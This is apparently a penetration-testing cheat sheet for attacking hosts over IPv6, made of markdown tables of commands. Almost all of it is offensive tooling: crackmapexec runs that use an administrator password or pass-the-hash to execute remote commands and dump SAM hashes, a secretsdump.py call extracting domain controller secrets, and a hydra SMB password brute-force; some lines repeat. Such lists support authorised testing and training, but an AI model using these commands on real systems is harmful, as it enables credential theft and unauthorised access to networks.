### IPv6 Assessment
| for Example  |
| ------------- |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -p 'Passw0rd' -x "ipconfig" |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210-u Administrator -H "Hash" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -H "Hash" -x "hostname"|
|python secretsdump.py -hashes "Hash" -just-dc acmebank.loca/Administrator@2001:DB8:7654:3210:FEDC:BA98:7654:3210 |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -p 'Passw0rd' -x "ipconfig" |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |

### IPv6 hydra Password Brute Force
| for Example  |
| ------------- |
|hydra -l Administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 smb://[IPv6] |

### IPv6 Services
| for Example  |
| ------------- |
|ssh carla@fe80::ea9a:8fff:fe67:190d%eth0 |
